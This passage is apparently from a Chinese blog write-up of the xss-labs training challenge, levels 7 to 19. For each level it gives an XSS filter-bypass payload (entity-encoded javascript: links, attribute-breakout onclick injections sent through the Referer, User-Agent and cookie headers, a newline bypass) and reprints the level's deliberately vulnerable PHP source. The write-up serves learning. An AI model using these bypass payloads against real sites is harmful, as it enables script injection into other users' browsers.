 window.location.href=&quot;level8.php?keyword=nice try!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level7&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str =strtolower( $_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
&lt;form action=level7.php method=GET&gt;
&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;&#39;;
?&gt;
&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="8-level-8"><a href="#8-level-8" class="headerlink" title="8. level-8"></a>8. level-8</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码，发现对双引号进行了转义</li>
</ul>
<p><img src="/images/xss/xss-lab/level-8-%E8%BD%AC%E4%B9%89.png" srcset="/img/loading.gif" alt="level-8-转义"></p>
<ul>
<li>看到既然是href，就想到了javascript伪协议</li>
<li>伪协议：<code>javascript:alert(1)</code></li>
<li>发现javascript的script被修改</li>
</ul>
<p><img src="/images/xss/xss-lab/level-8-%E4%BF%AE%E6%94%B9.png" srcset="/img/loading.gif" alt="level-8-修改"></p>
<ul>
<li>进行HTML实体编码：<code>&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</code></li>
<li>⭐ 点击友情链接，成功弹窗</li>
<li>源码分析<ul>
<li>strtolower()函数，将字符串转为小写</li>
<li>字符串匹配函数str_replace()，将<code>&lt;script</code>转换为<code>&lt;scr_ipt</code>，将<code>on</code>转换为<code>o_n</code>，将<code>src</code>转换为<code>sr_c</code>，将<code>data</code>转换为<code>da_ta</code>，将<code>href</code>转换为<code>hr_ef</code>，将双引号转义</li>
<li>htmlspecialchars()函数，但默认的第二个参数是不对单引号进行转义</li>
</ul>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level9.php?keyword=not bad!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level8&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);
echo &#39;&lt;center&gt;
&lt;form action=level8.php method=GET&gt;
&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;
&lt;input type=submit name=submit value=添加友情链接 /&gt;
&lt;/form&gt;
&lt;/center&gt;&#39;;
?&gt;
&lt;?php
 echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;
?&gt;
&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><h4 id="9-level-9"><a href="#9-level-9" class="headerlink" title="9. level-9"></a>9. level-9</h4><ul>
<li>跟level-8一样，插入level-8的payload</li>
<li>发现只有弹出提示”您的链接不合法?有没有”</li>
</ul>
<p><img src="/images/xss/xss-lab/level-9-%E9%93%BE%E6%8E%A51.png" srcset="/img/loading.gif" alt="level-9-链接1"></p>
<ul>
<li>输入正常的链接<code>http://www.baidu.com</code></li>
<li>发现可以正常显示</li>
</ul>
<p><img src="/images/xss/xss-lab/level-9-%E9%93%BE%E6%8E%A52.png" srcset="/img/loading.gif" alt="level-9-链接2"></p>
<ul>
<li>根据level-8的payload进行构造：<code>javascrip&amp;#x74;:alert(1)//http://</code><ul>
<li>http://用于绕过后台对http://的检测</li>
<li>//用于注释后面的http</li>
</ul>
</li>
<li>⭐ 点击友情链接，成功弹窗</li>
<li>源码分析<ul>
<li>strtolower()函数，将字符串转为小写</li>
<li>字符串匹配函数str_replace()，将<code>&lt;script</code>转换为<code>&lt;scr_ipt</code>，将<code>on</code>转换为<code>o_n</code>，将<code>src</code>转换为<code>sr_c</code>，将<code>data</code>转换为<code>da_ta</code>，将<code>href</code>转换为<code>hr_ef</code>，将双引号转义</li>
<li>htmlspecialchars()函数，但默认的第二个参数是不对单引号进行转义</li>
<li>strpos()函数，找寻字符串中是否有<code>http://</code></li>
</ul>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level10.php?keyword=well done!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level9&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);
echo &#39;&lt;center&gt;
&lt;form action=level9.php method=GET&gt;
&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;
&lt;input type=submit name=submit value=添加友情链接 /&gt;
&lt;/form&gt;
&lt;/center&gt;&#39;;
?&gt;
&lt;?php
if(false===strpos($str7,&#39;http://&#39;))
{
  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;
        }
else
{
  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;
}
?&gt;
&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><h4 id="10-level-10"><a href="#10-level-10" class="headerlink" title="10. level-10"></a>10. level-10</h4><ul>
<li>没有输入框，但url地址栏可以进行输入</li>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code>，发现页面也出现了相应的内容</li>
<li>F12查看源代码，发现有隐藏的表单，对表单的内容插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
</ul>
<p><img src="/images/xss/xss-lab/level-10-%E8%A1%A8%E5%8D%95.png" srcset="/img/loading.gif" alt="level-10-表单"></p>
<ul>
<li>发现只有t_sort字段读取到插入到内容，但过滤了<code>&lt;&gt;</code></li>
<li>又因为是input标签，value属性，又因为需要出现相关的内容来进行触发，插入修改Onclick事件尝试：<code>&quot; type=&quot;txt&quot; value=&quot;q&quot; onclick=&quot;alert(1)</code></li>
<li>⭐ 界面出现了文本框，点击弹出</li>
<li>源码分析<ul>
<li>字符串匹配函数str_replace()，匹配掉<code>&lt;&gt;</code>符号</li>
<li>以hidden表的形式存在，看不到输出</li>
</ul>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level11.php?keyword=good job!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level10&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str11 = $_GET[&quot;t_sort&quot;];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;&#39;;
?&gt;
&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="11-level-11"><a href="#11-level-11" class="headerlink" title="11. level-11"></a>11. level-11</h4><ul>
<li>跟level-10一样，只有url输入</li>
<li>直接F12查看源代码，果然有隐藏的表单，且t_ref字段跟refer字段内容一样</li>
</ul>
<p><img src="/images/xss/xss-lab/level-11-ref.png" srcset="/img/loading.gif" alt="level-11-ref"></p>
<ul>
<li>使用level-10的payload，但是使用的是referer头进行传值<ul>
<li>F12使用hackbar</li>
<li>Load URL</li>
<li>勾选Referer</li>
<li>填入level-10的payload：<code>&quot; type=&quot;txt&quot; value=&quot;q&quot; onclick=&quot;alert(1)</code></li>
<li>Execute</li>
</ul>
</li>
</ul>
<p><img src="/images/xss/xss-lab/level-11-refer%E4%BC%A0%E5%80%BC.png" srcset="/img/loading.gif" alt="level-11-refer传值"></p>
<ul>
<li>⭐ 界面出现了文本框，点击弹出</li>
<li>源码分析<ul>
<li>字符串匹配函数str_replace()，匹配掉<code>&lt;&gt;</code>符号</li>
<li>以hidden表的形式存在，看不到输出</li>
<li>▲ Referer泄露，以Referer值来进行数据提交，且没有过滤</li>
<li>htmlspecialchars()函数，但默认的第二个参数是不对单引号进行转义，也不对t_ref值进行转义处理</li>
</ul>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level12.php?keyword=good job!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level11&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
$str11=$_SERVER[&#39;HTTP_REFERER&#39;];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;&#39;;
?&gt;
&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="12-level-12"><a href="#12-level-12" class="headerlink" title="12. level-12"></a>12. level-12</h4><ul>
<li>跟level-10一样，只有url输入</li>
<li>直接F12查看源代码，果然有隐藏的表单，且t_ua字段跟user-agent字段内容一样</li>
</ul>
<p><img src="/images/xss/xss-lab/level-12-ua.png" srcset="/img/loading.gif" alt="level-12-ua"></p>
<ul>
<li>使用level-10的payload，但是使用的是user-agent头进行传值<ul>
<li>F12使用hackbar</li>
<li>Load URL</li>
<li>勾选user-agnet</li>
<li>填入level-10的payload：<code>&quot; type=&quot;txt&quot; value=&quot;q&quot; onclick=&quot;alert(1)</code></li>
<li>Execute<ul>
<li>⭐ 界面出现了文本框，点击弹出</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/xss/xss-lab/level-12-ua%E4%BC%A0%E5%80%BC.png" srcset="/img/loading.gif" alt="level-12-ua传值"></p>
<ul>
<li>源码分析<ul>
<li>字符串匹配函数str_replace()，匹配掉<code>&lt;&gt;</code>符号</li>
<li>以hidden表的形式存在，看不到输出</li>
<li>▲ User-Agent泄露，以User-Agent值来进行数据提交，且没有过滤</li>
<li>htmlspecialchars()函数，但默认的第二个参数是不对单引号进行转义，也不对t_ua值进行转义处理</li>
</ul>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level13.php?keyword=good job!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level12&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_ua&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;&#39;;
?&gt;
&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="13-level-13"><a href="#13-level-13" class="headerlink" title="13. level-13"></a>13. level-13</h4><ul>
<li>同样的操作，那这次应该是cookie了</li>
<li>填入level-10的payload：<code>user=&quot; type=&quot;txt&quot; value=&quot;q&quot; onclick=&quot;alert(1)</code><ul>
<li>▲ 注意cookie前头有一个user字段，需填入</li>
</ul>
</li>
<li>⭐ 界面出现了文本框，点击弹出</li>
</ul>
<p><img src="/images/xss/xss-lab/level-13-cookie%E4%BC%A0%E5%80%BC.png" srcset="/img/loading.gif" alt="level-13-cookie传值"></p>
<ul>
<li>源码分析<ul>
<li>字符串匹配函数str_replace()，匹配掉<code>&lt;&gt;</code>符号</li>
<li>以hidden表的形式存在，看不到输出</li>
<li>▲ Cookie泄露，以Cookie值来进行数据提交，且没有过滤</li>
<li>htmlspecialchars()函数，但默认的第二个参数是不对单引号进行转义，也不对t_cook值进行转义处理</li>
</ul>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level14.php&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level13&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;
&lt;?php 
setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
$str11=$_COOKIE[&quot;user&quot;];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_cook&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;&#39;;
?&gt;
&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="14-level-14"><a href="#14-level-14" class="headerlink" title="14. level-14"></a>14. level-14</h4><ul>
<li>因为文件一直不加载，所以F12查看一下源代码，发现应该是iframe相关的</li>
<li>直接进入level-15</li>
<li>▲ 2020.03.28 因为iframe加载问题，暂不实验</li>
</ul>
<p><img src="/images/xss/xss-lab/level-14-iframe.png" srcset="/img/loading.gif" alt="level-14-iframe"></p>
<ul>
<li>源码<ul>
<li>▲ 2020.03.28 暂不知道那里存在注入点</li>
<li>猜测iframe中的src来实现XSS注入</li>
</ul>
</li>
</ul>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;title&gt;欢迎来到level14&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;
&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="15-level-15"><a href="#15-level-15" class="headerlink" title="15. level-15"></a>15. level-15</h4><ul>
<li>▲ 此处有个坑，因为level-14不会自动跳转，需要点击按钮，但在level14.php中，跳转的href不是有效的链接，需要自己在url地址栏指定跳转的有效链接</li>
<li>▲ 因找不到注入点，网上寻求结果，发现我的xss-lab存在一定问题，后面的level就按网上的答案继续编写<ul>
<li>根据返回的源代码判断，变量src存在注入点</li>
<li>构造poc，并未触发xss，ng-include属性一直未生效，原来是调用的js文件中有地址被墙了，需要源代码中修改js源文件路径 <a href="https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js，触发xss" target="_blank" rel="noopener">https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js，触发xss</a></li>
</ul>
</li>
<li>源码<ul>
<li>ng-include本地文件包含，调用本地有xss漏洞的文件，触发xss</li>
<li>简单的一个htmlspecialchars()函数，但第二个参数默认不对单引号进行过滤</li>
</ul>
</li>
</ul>
<pre><code>&lt;html ng-app&gt;
&lt;head&gt;
        &lt;meta charset=&quot;utf-8&quot;&gt;
        &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level16.php?keyword=test&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level15&lt;/title&gt;
&lt;/head&gt;
&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;
&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;src&quot;];
echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;
?&gt;</code></pre><h4 id="16-level-16"><a href="#16-level-16" class="headerlink" title="16. level-16"></a>16. level-16</h4><ul>
<li>没有输入框，但url地址栏可以进行输入</li>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code>，发现页面也出现了相应的内容</li>
<li>F12查看源代码，没有过滤和转义</li>
<li>插入弹窗尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>发现对script以及/进行了转义</li>
</ul>
<p><img src="/images/xss/xss-lab/level-16-%E8%BD%AC%E4%B9%89.png" srcset="/img/loading.gif" alt="level-16-转义"></p>
<ul>
<li>采用回车符%0a进行绕过：<code>&lt;a%0atype=&quot;text&quot;%0aonclick=&quot;alert(1)&quot;&gt;</code></li>
<li>源码分析<ul>
<li>strtolower()函数，将字符串转为小写</li>
<li>str_replace()函数对script、空格、/转换为字符串实体<code>&amp;nbsp</code></li>
</ul>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level17.php?arg01=a&amp;arg02=b&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level16&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);
$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);
$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);
$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);
echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;
?&gt;
&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="17-level-17"><a href="#17-level-17" class="headerlink" title="17. level-17"></a>17. level-17</h4><ul>
<li>根据返回的代码判断，arg01和arg02提交的变量存在注入点</li>
<li>进行注入<ul>
<li>一直用的火狐浏览器没成功，最后发现是火狐不支持swf，改成ie浏览器就可以了</li>
</ul>
</li>
<li>▲ swf（来自百度百科）<ul>
<li>swf(shock wave flash)是Macromedia（现已被ADOBE公司收购）公司的动画设计软件Flash的专用格式，被广泛应用于网页设计、动画制作等领域，swf文件通常也被称为Flash文件。swf普及程度很高，现在超过99%的网络使用者都可以读取swf档案。这个档案格式由FutureWave创建，后来伴随着一个主要的目标受到Macromedia支援：创作小档案以播放动画。计划理念是可以在任何操作系统和浏览器中进行，并让网络较慢的人也能顺利浏览。swf 可以用Adobe Flash Player打开，浏览器必须安装Adobe Flash Player插件。</li>
</ul>
</li>
<li>源码</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;); 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level17&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;
&lt;?php
ini_set(&quot;display_errors&quot;, 0);
echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;
?&gt;
&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><h4 id="18-level-18"><a href="#18-level-18" class="headerlink" title="18. level-18"></a>18. level-18</h4><ul>
<li>▲ 此题需要ie环境</li>
<li>根据返回的源代码判断，arg01和arg02存在注入点，web服务器对双引号进行了过滤</li>
<li>改为onmouseover=alert(1)，去掉”，触发poc</li>
<li>源码</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level19.php?arg01=a&amp;arg02=b&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level18&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;
&lt;?php
ini_set(&quot;display_errors&quot;, 0);
echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><h4 id="19-level-19"><a href="#19-level-19" class="headerlink" title="19. level-19"></a>19. level-19</h4><ul>
<li>flash xss，涉及到反编译</li>
<li>源码</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level20.php?arg01=a&amp;arg02=b&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level19&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;
&lt;?php
ini_set(&quot;display_errors&quot;, 0);
